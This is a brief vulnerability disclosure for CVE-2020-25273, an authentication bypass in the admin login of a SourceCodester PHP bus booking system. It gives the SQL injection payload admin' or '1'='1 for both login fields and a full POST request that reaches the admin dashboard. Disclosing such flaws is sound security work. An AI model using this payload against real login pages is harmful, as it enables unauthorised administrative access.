# CVE-2020-25273
Online Bus Booking System 1.0,  there is Authentication bypass on the Admin Login screen in admin.php via username or password SQL injection.

#Vendor - SourceCodester 

#Product -https://www.sourcecodester.com/php/14438/online-bus-booking-system-project-using-phpmysql.html V 1.0

#Vulnerability Type - Authentication Bypass

#Affected Component - bus_booking/admin.php

#Attack Type- Local

#Privilege Escalation - true

#Impact Code execution - true

> ***Attack Vector***

> 1) Go to Admin Login Panel and try to bypass
>
> 2) In request payload, set  
>
>    username : admin' or '1'='1
>
>    password :  admin' or '1'='1
>
>__________________________________
>
> POST /bus_booking/login_auth.php HTTP/1.1
>
> Cookie: PHPSESSID=5d6832eeb2a8dfd424c1b6dcd73745a0
>
> username=admin'+or+'1'%3D'1&password=admin'+or+'1'%3D'1
> 
>________________________________________________________
>
>Successfull logged in to Admin Dashboard
